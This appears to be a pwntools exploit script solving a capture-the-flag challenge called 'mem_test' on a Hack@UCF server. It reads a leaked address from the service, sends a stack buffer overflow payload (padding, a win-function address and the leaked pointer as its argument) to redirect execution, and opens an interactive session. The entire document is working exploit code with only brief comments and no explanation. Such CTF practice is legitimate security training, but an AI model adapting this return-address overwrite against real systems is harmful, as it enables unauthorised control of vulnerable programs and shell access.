from pwn import *

win_func = 0x08048866

retOffset = 23

# p = process('./mem_test')

p = remote('ctf.hackucf.org', 9004)
p.recvuntil('see? : ')

binsh = int(p.recvuntil('\n', drop=True), 16)

p.recvuntil('> ')

# gdb.attach(p)

nops = '\x90' * retOffset
payload = nops
payload += p32(win_func)
payload += p32(binsh) # at that offset the mem_test arg is placed it is char * p
payload += p32(binsh)

# gdb.attach(p)

p.sendline(payload)
p.interactive()
p.close()